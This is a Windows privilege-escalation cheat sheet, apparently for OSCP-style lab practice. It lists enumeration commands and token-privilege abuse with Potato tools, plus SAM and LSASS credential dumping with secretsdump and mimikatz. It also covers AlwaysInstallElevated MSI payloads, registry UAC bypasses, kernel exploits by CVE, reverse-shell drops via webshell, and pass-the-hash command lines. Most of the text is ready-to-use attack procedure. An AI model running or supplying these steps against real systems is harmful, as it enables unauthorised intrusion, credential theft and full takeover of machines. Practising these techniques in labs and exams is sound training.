The discipline: whoami /priv FIRST — single highest signal-to-noise command on Windows. If it shows SeImpersonate / SeBackup / SeLoadDriver / SeManageVolume / SeDebug → you are 5 minutes from SYSTEM. Then winpeas in background while you do the manual list. Re-enum after every lateral hop — new user = entirely new token + new dpapi vault + new history.

▸ 0. CONTEXT
  • Confirm user — whoami; whoami /all; hostname
  • OS + patch level — systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
  • Architecture matters — x64 vs x86 picks your potato + .exe payloads
  • Domain vs workgroup — systeminfo | findstr Domain (domain → also see AD-privesc bank)
▸ 1. TOKEN PRIVS ⭐ DO THIS FIRST
  • whoami /priv — every "Enabled" priv is gold; "Disabled" can be enabled
  • SeImpersonate / SeAssignPrimary → Potato chain (PrintSpoofer / GodPotato / Juicy)
  • SeBackup / SeRestore → reg save SAM+SYSTEM → secretsdump LOCAL
  • SeLoadDriver → Capcom.sys / vulnerable driver
  • SeManageVolume → System32 ACL → DLL hijack
  • SeDebug → LSASS dump → mimikatz
  • SeTakeOwnership → take any file / reg key → modify
▸ 2. AUTOMATED
  • winPEAS — winPEASx64.exe quiet cmd in background
  • PowerUp — Import-Module .\PowerUp.ps1; Invoke-AllChecks
  • Watson / WES-NG — kernel exploit candidates from systeminfo
▸ 3. GROUPS / LOCAL ADMIN
  • whoami /groups — Backup Operators / Hyper-V Admins / DnsAdmins = privesc paths
  • net user; net localgroup; net localgroup Administrators
  • BUILTIN\Administrators member but UAC blocks you → UAC bypass
▸ 4. SERVICES
  • sc query state= all · wmic service get name,pathname,startname,state
  • Unquoted paths with spaces — wmic service get name,pathname | findstr /v "\""
  • Weak ACLs — accesschk.exe -uwcqv "Authenticated Users" *
  • Writable binpath / replaceable .exe / writable service dir
  • AutoRuns → registry keys + startup folders
▸ 5. ALWAYSINSTALLELEVATED
  • reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  • reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  • BOTH = 0x1 → msfvenom .msi → SYSTEM
▸ 6. STORED CREDS
  • cmdkey /list → runas /user:<u> /savecred cmd
  • dir /s /a /b *.config *.xml *.ini *unattend* | findstr /v WindowsApp
  • PowerShell history — (Get-PSReadLineOption).HistorySavePath
  • Browser DPAPI — saved logins → SharpDPAPI / mimikatz
  • SAM/SYSTEM/SECURITY hives if readable
▸ 7. SCHEDULED TASKS
  • schtasks /query /fo LIST /v
  • Writable task script / task-XML / referenced binary
  • Tasks running as SYSTEM or higher-priv user
▸ 8. WEBSHELL → POTATO PIVOT
  • If shell is www / apppool — drop reverse-shell binary to C:\inetpub\wwwroot\ or C:\xampp\htdocs\
  • Browse to it → catches as service account with SeImpersonate
  • Service accounts ALMOST ALWAYS have SeImpersonate — straight to Potato
▸ 9. UAC BYPASS (if in admin group)
  • fodhelper (HKCU\Software\Classes\ms-settings)
  • eventvwr (HKCU\Software\Classes\mscfile)
  • computerdefaults (HKCU\Software\Classes\ms-settings)
▸ 10. KERNEL (LAST RESORT)
  • WES-NG / Watson / Sherlock
  • Win 7 / 2008 R2 → MS16-032, MS15-051, MS14-058
  • Win 10 1903 → CVE-2020-0796 (SMBGhost — risky)
  • PrintNightmare (CVE-2021-34527) on unpatched Win10 / 2019

[ ⚠ ] ANTI-PATTERNS
winpeas crashes / takes forever → "guess I will skip enum"
The manual checklist takes 5 min. Run whoami /priv, whoami /groups, net user, net localgroup Administrators, cmdkey /list, systeminfo, reg query HKLM\Software\Policies\Microsoft\Windows\Installer. Often this is all you need.
SeImpersonate shows "Disabled" → assume Potato chain will not work
"Disabled" just means not currently in the token — programs CAN enable it. Run PrintSpoofer / GodPotato anyway. They enable + use the priv themselves. Free SYSTEM.
Run JuicyPotato on Windows Server 2019 / Windows 10 1809+
JuicyPotato is patched on those (DCOM CLSIDs blocked). Use PrintSpoofer (requires Spooler running) or GodPotato (no Spooler needed). RoguePotato as last fallback.
Found AIE one key = 0x1 → assume vulnerable
BOTH HKLM and HKCU must be 0x1 for AIE to fire. Either one alone is harmless. reg query both before generating the MSI.
Webshell as iis apppool, run whoami → "low privs", give up
Run whoami /priv next. apppool service accounts almost always have SeImpersonate. Upload PrintSpoofer. You are 3 commands from SYSTEM.
Kernel exploit first because "it always works"
Windows kernel exploits BSOD the box ~30% of the time. Tokens, services, AIE, stored creds first. PG and OSCP exam boxes are intentionally designed so kernel exploits are NOT the path. Save them for absolute last.
Unquoted service path found → drop random .exe → nothing happens
(1) Verify YOU have Write on the gap dir (icacls "C:\Program Files\"). (2) Verify the service auto-starts or restart it. (3) Use exe-service format from msfvenom, NOT plain exe — services kill non-service-format binaries in seconds.
cmdkey /list shows nothing → assume no saved creds
cmdkey shows only the CURRENT user's creds. Check every user. Browser DPAPI vaults. SAM/SYSTEM if you have SeBackup. Old Credential Manager backups in %APPDATA%\Microsoft\Credentials\. The vault has more than cmdkey shows.
UAC bypass tried → still medium integrity
Confirm whoami /groups | findstr "S-1-5-32-544" shows BUILTIN\Administrators. UAC bypass cannot make you admin you are not — it elevates an existing admin token. If not in that group, you need a DIFFERENT privesc, not UAC bypass.
SharpGPOAbuse runs, no error — but net localgroup still does not show user
Did you gpupdate /force on the TARGET box? GPO changes do not push instantly. Wait 90 min for natural refresh or force refresh on every box you want admin on. Verify GPO actually applied with gpresult /r.
Dump SAM, run secretsdump, get only NT hash → assume "cannot use, no password"
Pass-the-Hash with that NT hash directly. impacket-psexec administrator@<IP> -hashes :<NT>. evil-winrm -i <IP> -u administrator -H <NT>. nxc smb <IP> -u administrator -H <NT> --local-auth. You almost never need the plaintext.
